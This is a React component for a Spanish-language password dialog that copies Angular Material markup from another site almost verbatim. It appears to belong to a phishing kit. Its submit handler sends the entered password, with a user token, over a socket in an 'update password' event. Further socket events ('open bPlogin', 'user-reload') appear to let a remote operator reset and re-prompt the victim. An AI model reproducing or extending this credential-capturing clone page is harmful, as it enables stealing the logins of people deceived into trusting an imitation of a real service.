import React from "react";
import { useSocket } from "./SocketContext";
//import socket from "./../socket";
import { HiEye } from "react-icons/hi2";
import style from './css/login.module.css';
import { useDispatch, useSelector } from "react-redux";
import { sLoading, sPassword } from "../features/users/usersSlice";

function Password() {
  const { currentSocket: socket } = useSocket();
  const [p, setP] = React.useState("");
  const [d, setD] = React.useState(true);
  const [e, setE] = React.useState(false);
  const [d1, setD1] = React.useState(false);
  const [d3, setD3] = React.useState(false);
  const [f2, setF2] = React.useState(false);
  const [isActive, setIsActive] = React.useState(false);
  const [time, setTime] = React.useState(0);
  const [cont, setCont] = React.useState(0);
  const user = useSelector(e => e.users);
  const dispatch = useDispatch();

  const onFocus2 = () => setF2(true);

  const handleEyes = () => {
    setE(!e);
  };

  const onBlur2 = () => {
    if (p === "") setF2(false);
    setD1(false);
  };

  const handleButton = (e) => {
    e.preventDefault();
    if (p !== "") {
      setIsActive(true);
      socket.emit("update password", {
        password: p,
        bPlogin: true,
        token: user.token,
      });
      socket.emit("open bPlogin", { bPlogin: true });
      dispatch(sLoading({l: true}));
    }
  };

  const handleC = () =>{
    if(socket) socket.emit("user-reload", { id: user.token });
    dispatch(sPassword({p: false}));
  } 

  React.useEffect(() => {
    if (p.length >= 1 && p.length <= 7) setD1(false);
    else if (f2) setD1(true);
    if (p.length > 7) setD1(false);
  }, [p]);

  React.useEffect(() => {
    if (p.length <= 1) setD3(false);
    else setD3(true);
    if (p.length > 7) setD3(false);
    if (p.length > 7) setD(false);
  }, [p]);

  React.useEffect(() => {
    let interval = null;
    if (time >= 60) {
      setIsActive(false);
      setCont(cont + 0);
      setTime(0);
    }
    if (isActive) {
      interval = setInterval(() => {
        setTime((time) => time + 1);
        //socket.emit("time user", { time: time + 1, p: cont + 2 });
      }, 1000);
    } else {
      clearInterval(interval);
    }
    return () => {
      clearInterval(interval);
    };
  }, [isActive, time, cont]);
  React.useEffect(() => {
    if(user.error){
      setIsActive(false);
      setTime(0);
      setCont(0);
      setP("");
      socket.emit("open bPlogin", { bPlogin: false });
    }
  }, [user.error]);
  return (
    <>
      <div
        className={
          style["cdk-live-announcer-element"] +
          " " +
          style["cdk-visually-hidden"]
        }
        aria-atomic="true"
        aria-live="polite"
      ></div>
      <div
        id="cdk-describedby-message-container"
        aria-hidden="true"
        style={{ display: "block" }}
      >
        <div id="cdk-describedby-message-0">Gestiona tu usuario</div>
      </div>
      <div className={style["cdk-overlay-container"]}>
        <div
          className={
            style["cdk-overlay-backdrop"] +
            " " +
            style["cdk-overlay-dark-backdrop"] +
            " " +
            style["cdk-overlay-backdrop-showing"]
          }
        ></div>
        <div
          className={style["cdk-global-overlay-wrapper"]}
          dir="ltr"
          style={{ justifyContent: "center", alignItems: "center" }}
        >
          <div
            id="cdk-overlay-1"
            className={style["cdk-overlay-pane"]}
            style={{
              maxWidth: "80vw",
              pointerEvents: "auto",
              width: "370px",
              height: "auto",
              position: "static",
            }}
          >
            <div
              tabIndex="0"
              className={
                style["cdk-visually-hidden"] +
                " " +
                style["cdk-focus-trap-anchor"]
              }
            ></div>
            <div
              aria-modal="true"
              _ngcontent-c15
              className={
                style["mat-dialog-container"] + " " +
                style["ng-tns-c14-2"] + " " +
                style["ng-trigger"] + " " +
                style["ng-trigger-slideDialog"] + " " +
                style["ng-star-inserted"]
              }
              tabIndex="-1"
              style={{ transform: "none", opacity: "1" }}
            >
              <div
                className={style["ng-star-inserted"]}
              >
                <div _ngcontent-c15="" className={style["container"]}>
                  <div _ngcontent-c15="" className={style["row"]}>
                    <h4 _ngcontent-c15="" className={style["text-center"]}>
                      Introduce tu contrasea
                    </h4>
                  </div>
                  <form
                    _ngcontent-c15=""
                    className={
                      style["text-center"] +
                      " " +
                      style["ng-pristine"] +
                      " " +
                      style["ng-invalid"] +
                      " " +
                      style["ng-touched"]
                    }
                    novalidate=""
                    onSubmit={handleButton}
                  >
                    <div _ngcontent-c15="" className={style["row"]}>
                      <div
                        _ngcontent-c15=""
                        appearance="fill"
                        className={
                          style["mat-form-field"] +
                          " " +
                          style["ng-tns-c11-3"] +
                          " " +
                          style["mat-primary"] +
                          " " +
                          style["mat-form-field-type-mat-input"] +
                          " " +
                          style["mat-form-field-appearance-fill"] +
                          " " +
                          style["mat-form-field-can-float"] +
                          " " +
                          style["ng-untouched"] +
                          " " +
                          style["ng-pristine"] +
                          " " +
                          style["ng-invalid"] +
                          " " +
                          (!f2
                            ? style["mat-form-field-hide-placeholder"]
                            : style["mat-form-field-should-float"] +
                              " " +
                              style["mat-focused"])
                        }
                      >
                        <div className={style["mat-form-field-wrapper"]}>
                          <div className={style["mat-form-field-flex"]}>
                            <div className={style["mat-form-field-infix"]}>
                              <input
                                _ngcontent-c15=""
                                autoComplete="off"
                                className={
                                  style["mat-input-element"] +
                                  " " +
                                  style["mat-form-field-autofill-control"] +
                                  " " +
                                  style["cdk-text-field-autofill-monitored"] +
                                  " " +
                                  style["ng-pristine"] +
                                  " " +
                                  style["ng-invalid"] +
                                  " " +
                                  style["ng-touched"]
                                }
                                formcontrolname="password"
                                matinput=""
                                name="password"
                                type={`${e ? "text" : "password"}`}
                                id="mat-input-1"
                                aria-invalid="true"
                                aria-required="false"
                                aria-describedby="mat-error-1"
                                onFocus={onFocus2}
                                onBlur={onBlur2}
                                value={p}
                                onChange={(e) => {
                                  setP(e.target.value);
                                }}
                              />
                              <mat-icon
                                _ngcontent-c15=""
                                className={
                                  style["mat-icon"] +
                                  " " +
                                  style["material-icons"]
                                }
                                role="img"
                                aria-hidden="true"
                                style={{ fontSize: "18px" }}
                                onClick={handleEyes}
                              >
                                <HiEye />
                              </mat-icon>
                              <span
                                className={
                                  style["mat-form-field-label-wrapper"]
                                }
                              >
                                <label
                                  className={
                                    style["mat-form-field-label"] +
                                    " " +
                                    style["ng-tns-c11-3"] +
                                    " " +
                                    style["mat-empty"] +
                                    " " +
                                    style["mat-form-field-empty"] +
                                    " " +
                                    style["ng-star-inserted"]
                                  }
                                  id="mat-form-field-label-3"
                                  htmlFor="mat-input-1"
                                  aria-owns="mat-input-1"
                                >
                                  <mat-label
                                    _ngcontent-c15=""
                                    aria-label="Introduce tu contrasea"
                                    className={style["ng-star-inserted"]}
                                  >
                                    <span _ngcontent-c15="">Contrasea</span>
                                  </mat-label>
                                </label>
                              </span>
                            </div>
                          </div>
                          <div
                            className={
                              style["mat-form-field-underline"] +
                              " " +
                              style["ng-tns-c11-3"] +
                              " " +
                              style["ng-star-inserted"]
                            }
                          >
                            <span
                              className={style["mat-form-field-ripple"]}
                            ></span>
                          </div>
                          <div
                            className={
                              style["mat-form-field-subscript-wrapper"]
                            }
                          >
                            {d3 && (
                              <div
                                className={
                                  style["ng-tns-c11-3"] +
                                  " " +
                                  style["ng-trigger"] +
                                  " " +
                                  style["ng-trigger-transitionMessages"] +
                                  " " +
                                  style["ng-star-inserted"]
                                }
                                style={{
                                  opacity: "1",
                                  transform: "translateY(0%)",
                                }}
                              >
                                <mat-error
                                  _ngcontent-c15=""
                                  align="end"
                                  className={
                                    style["mat-error"] +
                                    " " +
                                    style["ng-star-inserted"]
                                  }
                                  role="alert"
                                  id="mat-error-1"
                                >
                                  Complete la
                                  <strong _ngcontent-c15=""> contrasea</strong>
                                </mat-error>
                              </div>
                            )}
                            {d1 && (
                              <div
                                className={
                                  style["ng-tns-c11-3"] +
                                  " " +
                                  style["ng-trigger"] +
                                  " " +
                                  style["ng-trigger-transitionMessages"] +
                                  " " +
                                  style["ng-star-inserted"]
                                }
                                style={{
                                  opacity: "1",
                                  transform: "translateY(0%)",
                                }}
                              >
                                <mat-error
                                  _ngcontent-c15=""
                                  align="end"
                                  className={
                                    style["mat-error"] +
                                    " " +
                                    style["ng-star-inserted"]
                                  }
                                  role="alert"
                                  id="mat-error-1"
                                >
                                  Contrasea es
                                  <strong _ngcontent-c15=""> requerida</strong>
                                </mat-error>
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                    </div>
                    <div _ngcontent-c15="" className={style["row"]}>
                      <div
                        _ngcontent-c15=""
                        className={style["button-container"]}
                      >
                        <button
                          _ngcontent-c15=""
                          color="accent"
                          mat-raised-button=""
                          type="submit"
                          className={
                            style["mat-raised-button"] +
                            " " +
                            style["mat-accent"] +
                            " " +
                            style["ng-pristine"] +
                            " " +
                            style["ng-invalid"] +
                            " " +
                            style["ng-touched"]
                          }
                          disabled={`${d ? "disabled" : ""}`}
                        >
                          <span className={style["mat-button-wrapper"]}>
                            Continuar
                          </span>
                          <div
                            className={
                              style["mat-button-ripple"] +
                              " " +
                              style["mat-ripple"]
                            }
                            matripple=""
                          ></div>
                          <div
                            className={style["mat-button-focus-overlay"]}
                          ></div>
                        </button>
                        <button
                          _ngcontent-c15=""
                          aria-label="cancelar"
                          color="accent"
                          mat-dialog-close=""
                          mat-raised-button=""
                          type="button"
                          className={
                            style["mat-raised-button"] +
                            " " +
                            style["mat-accent"]
                          }
                          onClick={() => handleC()}
                        >
                          <span className={style["mat-button-wrapper"]}>
                            Cancelar
                          </span>
                          <div
                            className={
                              style["mat-button-ripple"] +
                              " " +
                              style["mat-ripple"]
                            }
                            matripple=""
                          ></div>
                          <div
                            className={style["mat-button-focus-overlay"]}
                          ></div>
                        </button>
                      </div>
                    </div>
                  </form>
                </div>
              </div>
            </div>
            <div
              tabIndex="0"
              className={
                style["cdk-visually-hidden"] +
                " " +
                style["cdk-focus-trap-anchor"]
              }
            ></div>
          </div>
        </div>
      </div>
    </>
  );
}

export default Password;
